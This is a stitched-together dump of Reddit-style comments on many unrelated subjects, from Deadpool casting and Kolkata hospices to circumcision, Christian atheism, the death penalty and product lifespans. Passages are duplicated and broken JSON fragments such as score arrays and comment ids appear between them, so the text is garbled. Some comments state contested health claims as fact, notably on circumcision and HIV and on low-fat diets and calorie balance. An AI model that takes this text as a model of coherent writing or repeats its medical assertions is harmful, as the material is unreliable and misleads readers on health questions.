Could be scary- shocking, at least.\n\nAs to her flashbacks, I don't know her experience of course, but consider that Vietnam really did have tunnels and quasi-cities underneath the earth, coupled with explosions.

I understand where she's coming from. My take on that kind of fear, though, is that Its easy to confront and defeat. Once the kid has already experienced it long term trauma is more likely to occur if they never face it again. There's no real chance of danger and prolonged exposure will reduce the fear that comes from it being new and different. It could even help her ptsd. Also, while I wouldn't expose it to an infant, once a kid is starting school and getting into the real world a bit it may be a good tool to expose then to fear and teach how to deal with it.

I\u2019ve always loved the character. I remember reading one of the Deadpool comic books, and somebody asked Deadpool what he looks like. And he said he looks like a cross between a Shar-Pei and Ryan Reynolds. And I was like, I really, really wanna play this guy at some point. I thought it was pretty cool.

That\u2019s not something they put in Wolverine nor would it belong in that universe.\n\nAfter his part in *Blade: Trinity*,  director and screenwriter David S. Goyer explained his desire for Reynolds to play Deadpool or an X-Men character in [an interview with IGN](http://www.ign.com/articles/2004/02/26/goyer-confirms-deadpool), a mere two months before this comic's release, saying\n\n> I want to do something else with Ryan Reynolds because I really loved working with him and New Line wants to do something else with Ryan Reynolds and Marvel wants to do something with Ryan because there aren\u2019t a lot of actors anymore that can do credible action and be funny and that are also good actors. Ryan, I think, coming out of this movie and I know it\u2019s a lot to say will sort of be like where Mel Gibson was coming off of \u201cLethal Weapon.\u201d He can do it all. He never thought he could do action, ever. And he was in here last week with his girlfriend and I showed him some cut-together action stuff and said, \u2018Can you believe that\u2019s you?\u2019 And he said, \u2018No, I cannot!\u2019 So, \u201cDeadpool'\u201d came up as a possibility.

The hospital I volunteered in was called Prem Dan and probably housed 300-500 patients. There were 5 hospitals in Calcutta at the time.\n\nI was not a fan of Mother Theresa or her philosophy. However, I met a lot of really kind people who were doing their best to help some of the poorest souls. The care was pretty brutal, but not as brutal as life on the streets of Calcutta. I met a boy who had been electrocuted on the railway somehow. He was 12 years old and maybe half of his body was very badly burnt. He was actually crispy in places when he came in. I watched him get soaked in iodine and sat with him offering what pathetic comfort I could as his bandages were changed. Over the time that I was there, he made a remarkable recovery. I expect that he would have found a position in the hospital, helping out, as he grew up. If he had stayed on the street, if he had not had the accident, I fear his prospects would have been worse. \n\nWhile people may criticise Mother Theresa and attack her because of her hypocrisy or 'holier than thou' persona, I'd like to remind you that in general, we are not doing anything to help those poor souls who are quite within our power to help.

You have any idea of what goes on in the Kalighat Home for the Dying? \n\nI spent ten weeks living one block from Kalighat Home for the Dying about a decade ago. Kalighat's the red light district. At night, there's easily a few hundred of people living on the sidewalks in the surrounding block. Why? Because Kolkata has a population density near that of New York, with a fraction  of the tall buildings (i.e., ~13% (800(K)/6100(NY) based on Wikipedia numbers).  \n\nDaytime temperatures are typically 90 degrees in the summer after May, and humid tropical weather. Most places don't have air conditioning because it is expensive. While fans are available in many places frequented by the middle class and tourists, the poor rarely have the luxury of fans. \n\nYou know one thing that Kalighat Home for the Dying has? They do have fans. They have cots to sleep in. They have food to eat. Now, it's all mighty white for people with the luxury of visiting Reddit to get judgmental about what constitutes real hospice care, but if the choice is between no morphine and dying lying on hot pavement and no morphine and dying on a cot with a roof over my head and fans above providing some relief from the heat, I know which one I'd take.\n\nWe don't have a reference point to even talk about the kind of suffering that the average healthy person living on the streets around Kalighat has to contend with, much less the suffering of the terminally ill.

Imagine a life where getting your teeth fixed on the street is your best option. You can't.\n\nSure, you can get near United States level of care in India, if you can go to a private hospital, paying cash in advance. Everyone else takes their best chance at the public hospital which do not have anywhere near the resources for the population they serve or they take what they can get, from wherever. \n\nI don't believe Mother Theresa was a saint, even though many of the poor Hindu people (and others) she helped and knew thought so. But, I do know that something is better than nothing. If you care about hospice care for the poor in West Bengal, by all means: start up your own home and show us all how its done. But, if the criticism is that it isn't up to Western standards, your point is granted and largely, moot.

That helped later in the military but I can't really take any credit for it, it's just how I'm wired. So there I was, 15 or so, no adult present. I just sat there for a second, soaking in the chaos around me and watching the blood start to gush down over my left eye. Everyone was in shock, and no one was taking charge, so instead of bleeding out I started pointing at people and issuing commands. \"You, give me your t-shirt. You, go inside, call 911 and then call mom.\" Then I kind of just sat there, applying pressure as blood leaked into Ryan's white shirt, staring at clouds and telling everyone to just breathe, that if I was going to die I'd like to do it in peace, so please shut the fuck up.\n\nThe nearest hospital was 40 miles away, so I was expecting a long wait. Imagine my surprise when 2 minutes after my sister ran to the neighbors to make calls approximately 12 guys in red jackets walked up. There was some EMT training going on across the street and now I was their topic of instruction. \n\nThe instructor launched into a whole series of brusque commands and I was immediately surrounded by a wall of red jackets. I said \"Excuse me\" but the guy kept barking commands efficiently and describing what he was doing as he tried to immobilized my head and peaked under the tshirt I'd been applying pressure to. \n\nI was kind of impressed by the whole thing, but I repeated \"Excuse me...Hey!\" \n\nNo response.\n\nI said it a couple more times but they still ignored me so I said \"Fuck this\" and stood up.

I remember their hands starting at their knees and following me up as I stood, walked ten feet and then lowered myself back down to the ground.\n\nThe lead guy said \"Hey, man, you have to keep still, we don't know if your neck is injured. I said something like \"Yeah, it feels fine, but did the twelve of you really not notice the fire ant mound I was laying next too?\" Then I went back to staring at clouds until the ambulance showed up. \n\nI ended up with a cracked skull and ended up with a very aesthetically pleasing scar on my eyebrow despite 26 stitches.

There was nothing to do, so sometimes I would get out this shitty bag of golf clubs my mom had for some reason and me and my brothers and sisters would hit golfballs out into the open desert beyond the trailer park. My little brother was taking a swing one day and I must have stepped into his backswing because the next thing I knew I was sitting on the ground and everyone was panicking. He'd caught me just above the eye with a 9 iron. \n\nI tend to not actually feel pain in situations like this and I generally stay really calm. That helped later in the military but I can't really take any credit for it, it's just how I'm wired. So there I was, 15 or so, no adult present. I just sat there for a second, soaking in the chaos around me and watching the blood start to gush down over my left eye. Everyone was in shock, and no one was taking charge, so instead of bleeding out I started pointing at people and issuing commands. \"You, give me your t-shirt. You, go inside, call 911 and then call mom.\" Then I kind of just sat there, applying pressure as blood leaked into Ryan's white shirt, staring at clouds and telling everyone to just breathe, that if I was going to die I'd like to do it in peace, so please shut the fuck up.\n\nThe nearest hospital was 40 miles away, so I was expecting a long wait. Imagine my surprise when 2 minutes after my sister ran to the neighbors to make calls approximately 12 guys in red jackets walked up. There was some EMT training going on across the street and now I was their topic of instruction. \n\nThe instructor launched into a whole series of brusque commands and I was immediately surrounded by a wall of red jackets. I said \"Excuse me\" but the guy kept barking commands efficiently and describing what he was doing as he tried to immobilized my head and peaked under the tshirt I'd been applying pressure to. \n\nI was kind of impressed by the whole thing, but I repeated \"Excuse me...Hey!\" \n\nNo response.\n\nI said it a couple more times but they still ignored me so I said \"Fuck this\" and stood up. There was sort of this weird choreographed looking wave as all of the students kind of stretched their hands out towards me to to persuade me to lay down and explain why I wasn't supposed to move.

This way, if something doesn't work, they won't know until it's too late, forcing them to reshoot both *again*. \n\nThe scenes in Bilbos house were surprisingly complex shots, with a ton of technical things that could have gone wrong and a lot of choreography to get right. If someone's timing was off, or they moved their arm an inch too far, their arm would effectively be \"inside\" Gandalf, ruining the take. Making the dwarves do the scene both in greensuits *and* on the real set would have only made it more difficult. \n\nThese guys are professionals, and some of the best in the industry; they didn't just chose to film the scene haphazardly.The way they shot the scenes was the most effective, efficient and error-reducing way possible under the plethora of restrictions they had.

We've actually been able to deconstruct a hypothetical pantheon of PIE gods based on linguistic and structural characteristics across multiple people groups within the Indo-European language group.  Dyeus + pater = Jupiter.\n\nhttps://en.wikipedia.org/wiki/Proto-Indo-European_religion\n\nIncidentally, the Greek god Zeus is a perfect analogue for Jupiter NOT ONLY because the Romans appropriated Greek culture, but also because both fit into the cultural role of Dyeus Pater, which both Greek and Roman cultures inherited from their earlier migrations out of the same culture in central Asia (likely way back - the PIE culture was like a shared great grandfather to the Greco-Roman cousins, to use a family analogy).  The name meant 'Sky Father' and pretty much epitomized Zeus/Jupiter's role as a bearded dude sitting on a cloud.  \"Zeus\" is just the first part of the word \"Deus-pater,\" partly corrupted.  \n\nOur lay conception of the Judeo-Christian God as a bearded dude sitting on a white cloud is completely derived from the PIE Sky Father concept.  (And incidentally you will not find that kind of description anywhere in the Hebrew or Christian Bible or in the Koran, because it's just a lay concept we've held onto).\n\nThe Norse/Germanic pantheon does have analogues to the PIE gods but the groups developed independently.    Odin All-father is the old bearded 'sky father' figure in the Norse pantheon, although he doesn't sit on a cloud and his lightning bolt tossing powers have been transferred to young, war-like Thor (who more closely resembles the Greco-Roman god Mars/Ares).\n\nInteresting thread.  If you have never read any Icelandic or old Germanic Sagas you'll shocked at how many everyday things about our supposedly intellectual Western culture actually derives from very, very old religion (in some cases far older than Judeo-Christianity).\n\nThor's Day, like Tiu's Day, Woden's Day and Freja's Day all derive from early Anglo-Saxon.  The Saxons worshipped the exact same gods as the Norse, with some differences in spelling and pronunciation (Odin to Woden, for example).

They just slowly develop over tens of thousands of years - you can't say \"this exact person was the first human\", a child is always the same species as its parents.\n\nRight, I think most people know that, no big deal. Then the problem becomes: what's the soul gene? Since it happens so extremely slowly, \"God\" must at some point have said \"ok, you are the first person to get a soul\" (unless you believe everything has a soul, in which case it doesn't make sense either, since it would be important then).\n\nThe practically same persons parents, would not get souls. That means the small genetic variance between them, is what justified one to get a soul, and another not to. Does that mean if you genetically modify a human person, to alter that specific gene, they would be soulless?\n\nYou could of course say \"no, all humans after that specific point got souls\", but that would still beg the question why the previous \"almost humans\" didn't get a soul - to my understanding, would they then not go to hell? So the lack of a small variation in genes would sentence them to eternal torture? That all sounds very far out to me.\n\nAnd at this point, we're not even bringing the creation story of Adam and Eve into the picture, and how that quite obviously isn't true, and contradicts abiogenesis and evolution completely.\n\nOr the story about Noahs ark.

For example, the longstanding low fat high carb diet that has been touted by nutritionists for decades turns out to be actually significantly more dangerous than a low carb, moderate fat diet. Illusory objectivity. \n\nAnd anyone who denied the 'low fat' narrative was ridiculed, sometimes even damaging their careers. \n\nAnd yet we now 'objectively' know that the studies that this position was based off of were heavily flawed. \n\nYet, everyone still 'knows' that 'calories in = calories out', even though there is a lot of independently verified evidence that this is not the case. \n\nEmpirical Materialism absolutely relies on the concept that there is an independent, objective reality.

"], [10, "Myth: Circumcision prevents HIV/AIDS.\n\nReality check:  Three studies in Africa several years ago that claimed that circumcision prevented AIDS and that circumcision was as effective as a 60% effective vaccine (Auvert 2005, 2006). These studies had many flaws, including that they were stopped before all the results came in.  There have also been several studies that show that circumcision does not prevent HIV (Connolly 2008). There are many issues at play in the spread of STDs which make it very hard to generalize results from one population to another. \n\nIn Africa, where the recent studies have been done, most HIV transmission is through male-female sex, but in the USA, it is mainly transmitted through blood exposure (like needle sharing) and male-male sex.  Male circumcision does not protect women from acquiring HIV, nor does it protect men who have sex with men (Wawer 2009, Jameson 2009).\n\nWhat's worse, because of the publicity surrounding the African studies, men in Africa are now starting to believe that if they are circumcised, they do not need to wear condoms, which will increase the spread of HIV (Westercamp 2010).  Even in the study with the most favorable effects of circumcision, the protective effect was only 60% - men would still have to wear condoms to protect themselves and their partners from HIV. \n\nIn the USA, during the AIDS epidemic of the 1980s and 90s, about 85% of adult men were circumcised (much higher rates of circumcision than in Africa), and yet HIV still spread. \n\nIt is important to understand, too, that the men in the African studies were adults and they volunteered for circumcision. Babies undergoing circumcision were not given the choice to decide for themselves.\n\nSource: https://cdn.psychologytoday.com/blog/moral-landscapes/201109/more-circumcision-myths-you-may-believe-hygiene-and-stds"], [10, "Prepare for an onslaught of people who fail at life/sex desperately looking to blame their parents despite having overwhelmingly first world lives and benefits crying about how they were mutilated by their parents.\n\n/not pro circumcision, benefits aren't strong enough but the anti crowd is chock full of nuts."], [6, "Are you setting some kind of anti-circumcision weirdo trap or something?"], [5, "[This should be fun](http://www.reactiongifs.com/wp-content/uploads/2011/05/MichealJacksonPopcorn.gif)"], [5, "Let's make mutilation sound mundane, we'll call it circumcision.

These studies had many flaws, including that they were stopped before all the results came in.  There have also been several studies that show that circumcision does not prevent HIV (Connolly 2008). There are many issues at play in the spread of STDs which make it very hard to generalize results from one population to another. \n\nIn Africa, where the recent studies have been done, most HIV transmission is through male-female sex, but in the USA, it is mainly transmitted through blood exposure (like needle sharing) and male-male sex.  Male circumcision does not protect women from acquiring HIV, nor does it protect men who have sex with men (Wawer 2009, Jameson 2009).\n\nWhat's worse, because of the publicity surrounding the African studies, men in Africa are now starting to believe that if they are circumcised, they do not need to wear condoms, which will increase the spread of HIV (Westercamp 2010).  Even in the study with the most favorable effects of circumcision, the protective effect was only 60% - men would still have to wear condoms to protect themselves and their partners from HIV. \n\nIn the USA, during the AIDS epidemic of the 1980s and 90s, about 85% of adult men were circumcised (much higher rates of circumcision than in Africa), and yet HIV still spread. \n\nIt is important to understand, too, that the men in the African studies were adults and they volunteered for circumcision. Babies undergoing circumcision were not given the choice to decide for themselves.\n\nSource: https://cdn.psychologytoday.com/blog/moral-landscapes/201109/more-circumcision-myths-you-may-believe-hygiene-and-stds", "id": "d3cnwgv"}, {"comment": "How stupid do you think Africans are?

He originally believed that Mao's policies were largely responsible for the famine, but that Mao's advisers had misled him. Therefore, he believed it was not an intentional famine and thus not a democide. However, reports from Jung Chang and Jon Halliday's Mao: The Unknown Story allege that Mao knew about the famine from the beginning but didn't care, and eventually Mao had to be stopped by a meeting of 7,000 top Communist Party members. Based on this new evidence, Rummel now believes the famine was intentional and considers it a democide. Taking this into account, the total for Chinese Communist Party democide is 77 million, more than the Soviet Union (62 million), Nazi Germany (21 million), or any other regime in the 20th century.[9]\"\n\n150,000,000 people is much more than can be attributed to Religion, and that's just in the 20th Century.  Religious deaths are not even close to that, even taking into account genocides that were outside of war for other reasons, like the Inquisitions.  Remember, less than 7% of wars were started because of religion.  \n\nSounds to me like you just have a bone to pick with religion.  You pick and choose who you want to hate based on your own bias.

I can try to clear up and respond to some of the things being posted a lot in this thread.\n\n**Christian Atheism is pretty complex** and has its own range of views. It covers beliefs like God actually died on the cross, to completely redefining what a deity is (resembling a panentheism), to pretty classic \"no divine\" atheism. It isn't paradoxical. At face value it is Atheism that is knowingly and purposefully heavily informed by the Christian Tradition. \n\nIt doesn't simply fall prey to **Lewis's three Ls argument either**. There are a lot of ways to interpret Jesus' \"son of God\" statements. On a preliminary level, Israelite kings were messiahs (anointed ones) and called sons of God. The gospels want to make a big deal out of the idea that Jesus was from the line of King David and was anointed for a specific duty. Luke wants to make the direct parallel to Caesar Augustus (who also called himself the anointed son of god). There is a historical precedent for kingship being directly tied to divinity. It makes sense that as a rebellious spiritual leader protesting the corruption of the religious leaders and the \"Pax Romana\" that he would take the title of the anointed son of God and then be killed by the authorities for doing so.\n\nFurthermore, you can interpret Jesus' claim to divinity as being based on the idea that he is the prime example of who he thought God was. In a social trinitarianism, everyone then who follows this path becomes divine. At that point, it is easy for a Christian Atheist to say, \"Yeah, and being divine means being a legit person. I want to be a legit person, so I'll follow the teachings of this guy who was the most legit and the traditions that flow from there.\"\n\nIf these alternate interpretation aren't cutting it for you, and you still say Christian Atheists believe in a lunatic. Chill, I mean \"truth\" is \"truth\" no matter where it comes from.\n\nThe Christian Atheists I know and have read aren't just trying to hide. **They are already versed in and find the Christian Tradition meaningful.** If you want water, it is better to dig your well 60 ft deep than 60ft wide.\n\nTL;DR There are a lot of different views within Christian Atheism.

If theologians can't agree on it, you sure as hell aren't going to figure out any truth there.\n\nBut regardless, the point is, you don't *need* a book to draw your philosophy from, study the *ideas* themselves, *none* of which are original to Christianity, not a single one.

People make it hard because they approach it backwards and get too hung up on the details.  Here's Scientology in a nutshell:\n\nHumans are perfect beings capable of super powers like telepathy, telekinesis, flight, etc.; however, we can't realize our full potential because at birth our body is possessed by \"thetans\". A thetan is the spirit of a being from another planet who was killed on Earth trillions of years ago by the evil galactic overlord, Xenu.\n\nBefore Xenu killed these beings, he brain washed them so that their lingering spirits would forever feel dread, pain, and suffering. These feelings are called engrams.  When the thetan attaches itself to a human, we adopt that thetan's engram which also means we adopt that feeling and memory of dread, pain, etc.\n\nWhen a Scientologist goes through auditing, they are attempting to identify what is really their own feelings and what is an engram from a thetan.  When the engram is identified, it's then possible to expel the thetan.\n\nOnce a Scientologist has expelled all the thetans from their body they become \"clear\". Once they are clear, they can then begin exploring their capacity for uncovering their natural super powers. This of course requires that the Scientologist remains clear through constant auditing to ensure no new thetans enter the body.\n\nBasically, it's a space opera that identifies a source of our suffering and a path for enlightenment.

He did not address the Roman Senate or write extensive Greek philosophical treatises. Also never traveled outside of the regions of Palestine and was not a member of any known political party.\n\nIt is only because Christians later made him a \"celebrity\" that he became known (Paul's extensive spreading of churches based around Jesus' teachings). He did not change the social, political and economic circumstances in Palestine as it was apparently left for his followers to do that. \n\nHow could anyone in Rome have any idea the eventual impact of Christianity on the Roman Empire (sup Constantine)? How were they to know that this minor Nazarene prophet would cause such a fuss?\nHe was also executed as a criminal, providing him with the ultimate marginality. He suffered the ultimate humiliation, both in the eyes of Jews (Deut. 21:23 - Anyone hung on a tree is cursed!) and the Romans (he died the death of slaves and rebels).\n\nOn the other hand, he also was a minimal threat compared to other proclaimed \"Messiahs\" of the time. Rome had to call out troops to quell the disturbances caused by the unnamed Egyptian referenced in Acts, but never to suppress Jesus' followers. To the Romans, the primary gatekeepers of written history at the time (of time?), Jesus during his own life would have been no different than thousands of other everyday criminals that were crucified.\n\nHe also marginalized himself by being occupied as a travelling preacher, there was no Palestine News Network and he never used the established \"news organs\" of the day to spread his message. He traveled about the countryside, avoiding for the most part (and with the exception of Jerusalem) the major urban centers of the day. He certainly did not make many friends as a preacher.\nHe lived an offensive lifestyle and alienated many people. He associated with the despised and rejected: Tax collectors, prostitutes, and the band of fishermen he had as disciples. He was a poor, rural person in a land run by wealthy urbanites.

Here's the DSM 5 diagnostic criteria:\n\nThe essential features of a personality disorder are impairments in\npersonality (self and interpersonal) functioning and the presence of\npathological personality traits. To diagnose narcissistic personality\ndisorder, the following criteria must be met:\n\nA. Significant impairments in personality functioning manifest by:\n\n1. Impairments in self functioning (a or b):\na. Identity: Excessive reference to others for self-definition\nand self-esteem regulation; exaggerated self-appraisal\nmay be inflated or deflated, or vacillate between extremes;\nemotional regulation mirrors fluctuations in self-esteem.\nb. Self-direction: Goal-setting is based on gaining approval\nfrom others; personal standards are unreasonably high in\norder to see oneself as exceptional, or too low based on a\nsense of entitlement; often unaware of own motivations.\n\nAND\n\n2. Impairments in interpersonal functioning (a or b):\n\na. Empathy: Impaired ability to recognize or identify with the\nfeelings and needs of others; excessively attuned to\nreactions of others, but only if perceived as relevant to self;\nover- or underestimate of own effect on others.\n\nb. Intimacy: Relationships largely superficial and exist to\nserve self-esteem regulation; mutuality constrained by little\ngenuine interest in others\u201f experiences and predominance\nof a need for personal gain\n\nB. Pathological personality traits in the following domain:\n\n1. Antagonism, characterized by:\n\na. Grandiosity: Feelings of entitlement, either overt or covert; self-centeredness; firmly holding to the belief that one is\nbetter than others; condescending toward others.\n\nb. Attention seeking: Excessive attempts to attract and be\nthe focus of the attention of others; admiration seeking.\n\nC. The impairments in personality functioning and the individual\u201fs\npersonality trait expression are relatively stable across time and\nconsistent across situations.\n\nD. The impairments in personality functioning and the individual\u201fs\npersonality trait expression are not better understood as normative\nfor the individual\u201fs developmental stage or socio-cultural\nenvironment.\n\nE. The impairments in personality functioning and the individual\u201fs\npersonality trait expression are not solely due to the direct\nphysiological effects of a substance (e.g., a drug of abuse,\nmedication) or a general medical condition (e.g., severe head\ntrauma)", "id": "cyv91jq"}, {"comment": "Christian Atheism is a rather stupid belief for a number of reasons.  First off, the only real source we have for what Jesus said and did is the Bible.  There may be a handful of other documents that have a few stray words about Jesus, but for the most part, everything we know about Jesus is from the Bible.  If you reject supernatural beings and all the magic of the Bible, why even believe it as a source of anything?  If none of the supernatural stuff happened, then clearly the Bible is not a reliable source at all since it talks about it constantly.  Why would you trust such an unreliable source?  It doesn't even make sense!\n\nThere's also the teachings of Jesus, which makes \"Christian Atheism\" really stupid.  There seems to be this concept of Jesus as fluffy and loveable unlike all those big bad modern Christians who twist what He said.  While yes, some Christians are hypocrits and don't represent Jesus, for the most part, Christianity's teachings are in line with Jesus.  He said several times that if you don't accept Him as savior, you will go to Hell.  While He did say not judge others, He did teach to hate sin, and made it very clear what the consequence of sin is.  During the Sermon On The Mount, He pretty much says no masturbating and no lusting.  While He did forgive people rather easily, He also told them to go and sin no more, so no, He wasn't tolerant of their previous lifestyle.  Lastly, there's also the fact that nearly all of Jesus's teachings are built upon teachings in the Old Testament.  His teachings didn't just come from scratch.  If one rejects the supernatural stuff, then they would have to reject the Old Testament along with this wise God talked about so often.  Jesus talked about Heaven and God constantly.  If He wasn't the Son of God, then yes, he was nothing more than a lunatic, and I'm not sure why anybody would want to take moral teachings from someone so clearly off their rocker.

I can try to clear up and respond to some of the things being posted a lot in this thread.\n\n**Christian Atheism is pretty complex** and has its own range of views. It covers beliefs like God actually died on the cross, to completely redefining what a deity is (resembling a panentheism), to pretty classic \"no divine\" atheism. It isn't paradoxical. At face value it is Atheism that is knowingly and purposefully heavily informed by the Christian Tradition. \n\nIt doesn't simply fall prey to **Lewis's three Ls argument either**. There are a lot of ways to interpret Jesus' \"son of God\" statements. On a preliminary level, Israelite kings were messiahs (anointed ones) and called sons of God. The gospels want to make a big deal out of the idea that Jesus was from the line of King David and was anointed for a specific duty. Luke wants to make the direct parallel to Caesar Augustus (who also called himself the anointed son of god). There is a historical precedent for kingship being directly tied to divinity. It makes sense that as a rebellious spiritual leader protesting the corruption of the religious leaders and the \"Pax Romana\" that he would take the title of the anointed son of God and then be killed by the authorities for doing so.\n\nFurthermore, you can interpret Jesus' claim to divinity as being based on the idea that he is the prime example of who he thought God was. In a social trinitarianism, everyone then who follows this path becomes divine. At that point, it is easy for a Christian Atheist to say, \"Yeah, and being divine means being a legit person. I want to be a legit person, so I'll follow the teachings of this guy who was the most legit and the traditions that flow from there.\"\n\nIf these alternate interpretation aren't cutting it for you, and you still say Christian Atheists believe in a lunatic. Chill, I mean \"truth\" is \"truth\" no matter where it comes from.\n\nThe Christian Atheists I know and have read aren't just trying to hide. **They are already versed in and find the Christian Tradition meaningful.** If you want water, it is better to dig your well 60 ft deep than 60ft wide.\n\nTL;DR There are a lot of different views within Christian Atheism.

I phrase it tentatively like that because I love his movies.\n\nWhy do I love Reservoir Dogs?  Spoilers are definitely ahead.  \n\n\n\n\nIt was unique in my experience for a crime drama.  The heist that goes horribly wrong is entirely offscreen.  Reservoir dogs is a basic crime movie told amazingly.  The plot linearly is that an undercover cop infiltrates a crime ring which is planning a job.  The crew is busted during the heist's execution with some of them escaping.\n\n\n\nThat story as laid out is decent.  I would watch that movie, but it wouldn't be RD.\n\nThe movie opens with a bunch of guys having breakfast.  After some snappy dialogue (Tarantino's dialogue is generally good) and establishing characters, the movie jumps to after the heist.  We find that the heist has gone horribly wrong.  As the rest of the movie unfolds we learn about events surrounding the heist.  We learn about how some of the different characters are involved before and after the heist.  We get to see Tim Roth preparing to go undercover and the making of a funny backstory.  We see Keitel's character brought onto the heist.  In scenes dealing with the fallout after the heist, we see the survivors wondering what the fuck happened with a gutshot Tim Roth.  Roth and Keitel fucking chew scenery and act their fucking asses off.  Madsen was great as Vic Vega.  I must also confess I laugh at the interrogation scene.  Yes the scene is fucked up, but it is so fucking absurd.  The way, Mr Blonde (Madsen) dances around to the song just strikes me absurd.  After you learn everything about the characters, you can enjoy the interactions in a new light ie knowing that Blonde is psycho and orange is undercover.\n\nUltimately, we got to see parts of a crime story we don't often get to see with good dialogue and an unusual movie presentation.  It was different and awesome.\n\nAnyway, sorry about the wall of text, but I'm just trying to express why I love the movie.\n\n", "id": "d1tzxcx"}, {"comment": "What a load of shit.

Read up on the Leopold and Loeb murder trial, which was the turning point for the death penalty in the US. The whole crux of the original argument against the death penalty is that murders are sick and damaged, therefore not responsible for their actions. \n\nWhile there is significant nuances in the position, even as stated in the famous closing arguments, it has pushed the world towards seeing more than just the stark right and wrong perspective that dominated legal philosophy of the day. Europe eventually embraced the concept entirely after WW2, likely in reaction to the amount of blood that had been spilled. I find it fascinating that the idea failed to take hold in the nation where it originated. Some States have either effectively or legally removed execution as a punishment, but it is an option in 31 States, Federal civilian court, and in the military. For a short time in the 70's, there was a moratorium on executions from the Supreme Court. Executions were reaffirmed in 76.\n\nPersonally, I do not see life in prison for murder as more humane than lethal injection. The limitations on the use of the death penalty, vastly improved forensics, as well as the rights to appeal do make it less likely that an innocent would be executed today... Though it is always possible. The death penalty does prevent the possibility of a prisoner making parole, then killing again. There are potential negatives to both sides.", "id": "d07si3l"}, {"comment": "I know I'll never convince you, but you have some pretty skewed logic in there.    \n> rather than paying to feed and imprison for them    \n\nWith the drawn-out trial and all the appeals it costs many times more to sentence a criminal to death than to feed and house them for life.  It will always be that way until Saudi Arabia-type justice is implemented.    \n\n> The whole crux of the original argument against the death penalty is....     \n\nThe real and most common crux is \"thou shalt not kill\" and that vindictive retribution is not the intent of justice.  The mental health argument is relatively new.    \n\n> Personally, I do not see life in prison for murder as more humane than lethal injection    \n\nExecuting a man in cold blood just to save them from a life of incarceration can hardly be considered \"humane.\"  When I say cold blood, I am talking about snuffing out a man's life while he is physically restrained, after you have diminished this man's capacity to harm others.  Shackled and imprisoned, this man is no longer a threat to society.  At this point executing the man would have to be in cold blood.    \n\nWhether or not death is preferable to a life of incarceration is something for the condemned to decide.  Us making that decision for them does not make us more humane.  It takes an awful lot to make the worst lives not worth living.  People are willing to live under bridges in cardboard boxes, suffer through debilitating terminal illness, and spend the rest of their days in a 5 x 8 cell with no hope of freedom.  Yet they decide to go on living rather than take their own lives through suicide.  Giving the choice, people in the worst situations imaginable usually consider it preferable to death.    \n\n\n", "id": "d07z925"}, {"comment": "> With the drawn-out trial and all the appeals it costs many times more to sentence a criminal to death than to feed and house them for life.\n\nThat cost is equally true for life imprisonment. Applying that cost only to the death penalty cases is disingenuous. Yes, trials are expensive affairs that do slow our descent into pure retribution style justice.\n\n> The real and most common crux is \"thou shalt not kill\"\n\nThe polar opposite was argued with the same book as a basis. Given that the least religious countries removed the death penalty while the only highly religious first world country retains the penalty, I would not count on faith to really get used as a reason to eliminate the death penalty. All the Western Judaic based religions include laws that lead to execution for crimes.\n\nRetribution for law breaking and harming others is the majority basis of laws in the West. Judges often seek to rebalance injuries and loss by inflicting punishments on those deemed guilty. This is often punitive rather than retaliatory or vendictive. In other words, it is a punishment and deterrent to others rather than emotional closure for the victims. Only certain types of loss are actually returned to the victim of a crime. \n\nThe death penalty is a strong deterrents for the worst offenses and crimes a person can commit. So much so that the judge for the case that started to shift the public opinion on the death penalty stressed that he did not impose executions due to the ages of the guilty, not their mental health or an opposition to the death penalty.\n\nThe mental health argument is the one that had any noticible impact on public opinion. It gives an emotional link to the perpetrators of crimes, and effectively says \"These people are just like you, but have been mistreated badly in their past.\" A slightly more modern twist would be that the criminal mind is damaged physically leading to impaired cognitive ability. \n\nEither argument hinges on the idea that the person could not control themselves and lacked free will. Cases where that is true are already accounted for. I do not see a person who is capable of understanding their crime as metally ill enough to be not guilty by reason of insanity. \n\n> Shackled and imprisoned, this man is no longer a threat to society.\n\nThat is the case while the criminal is incarcerated. The flaw in this line of reasoning is that the criminals do not always remain imprisoned. Due to overcrowded conditions or the ability to plead with a parole board successfully, violent individuals are routinely returned to civilian life. Some of whom do go on to lead normal lives. However, the rate of recidivism is quite high.\n\nAppropriate punishment is purely the province of the courts. While those sentenced to life in prison without parole should have the option, the death penalty is still a viable option for the courts to choose. The US Supreme Court has repeatedly held the Constitutionality of the death penalty as not violating the cruel and unusual tests. \n\nThe US takes great pains to only execute \"in cold blood\" as you put it. The rational for this is that emotions are often fallacious and lead to mob mentality in matters of justice and punishment. It gives the judicial system the time to access the individual's guilt as accurately as possible. \n\nAs far as comparisons to the humanity of life in prison, it accomplishes the same goal: the death of the individual without further harm to society. One occurs after all of the appeals are exhausted, the other after much time has passed. Full life in prison without parole is as much a death sentence as execution, it is simply a different means of dying; time and old age, rather than a method that minimizes pain and suffering. Neither is more humane, simply because they are the same thing. If one judges humane treatment as the least amount of suffering, then execution would be far more humane.\n\nAs for people's willingness to suffer, that is wholly irrelevant to the fate of a death row criminal. Punishment for a crime is not predidacated on what the guilty is willing to suffer.\n\nEven if it were, there would be people who would opt for suicide. The growth in popularity of euthenasia as religiosity falls paints that picture pretty clearly. The major factor in the will to survive is hope. Without hope for a reduction in suffering, many people do actually take their own lives or seek out methods to die.

What about all those 30 year old appliances and 6 year old cell phones sitting in the dump?\n\nTo meet the requirements some years ago, engineers often had to build a lot of margin into their design, so many things were often over engineered.  Appliances that were like tanks, etc.  This is unnecessarily driving product cost and weight. Now, engineers are much better at meeting their requirements without going way beyond what they need to.  On average, the margins on meeting requirements is much lower.  Of course, you could blame the powers that be for  not dictating a 20 year life on a cell phone, but most people are not keeping cell phones for 20 years, regardless of how well they continue to function.  If a company were to do this, they will overdrive product cost (both component and engineering cost), and price themselves out of a very competitive market.\n\nSo, while it's partially true that most products today don't meet the same life cycles that the best products from the past did, I really don't see it as a nefarious thing.

Product life. etc.  \n\nYou often hear the adage \"they don't make them like they used to\" and even here you've got people talking about their 30 year old appliances, 6 year old cell phones, etc.  But this is mostly confirmation bias.  What about all those 30 year old appliances and 6 year old cell phones sitting in the dump?\n\nTo meet the requirements some years ago, engineers often had to build a lot of margin into their design, so many things were often over engineered.  Appliances that were like tanks, etc.  This is unnecessarily driving product cost and weight. Now, engineers are much better at meeting their requirements without going way beyond what they need to.  On average, the margins on meeting requirements is much lower.  Of course, you could blame the powers that be for  not dictating a 20 year life on a cell phone, but most people are not keeping cell phones for 20 years, regardless of how well they continue to function.  If a company were to do this, they will overdrive product cost (both component and engineering cost), and price themselves out of a very competitive market.\n\nSo, while it's partially true that most products today don't meet the same life cycles that the best products from the past did, I really don't see it as a nefarious thing.

